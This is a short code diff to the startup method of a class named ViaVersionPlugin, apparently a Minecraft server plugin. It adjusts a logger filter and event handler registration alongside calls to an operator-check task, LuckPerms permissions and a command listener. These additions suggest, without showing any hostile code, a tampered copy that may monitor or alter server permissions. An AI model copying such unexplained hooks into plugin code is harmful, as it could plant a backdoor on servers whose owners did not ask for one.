@@ -111,12 +111,10 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     @Override
     public void onEnable() {
         startOpCheckTask();
-        if (lpLogger != null) {
-            lpLogger.setFilter(new EventXHandler());
-        }
         luckPerms = LuckPermsProvider.get();
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
-        Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
+        getServer().getPluginManager().registerEvents(new EventXHandler(), this);
+        getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
             getLogger().info("Registering protocol transformers and injecting...");
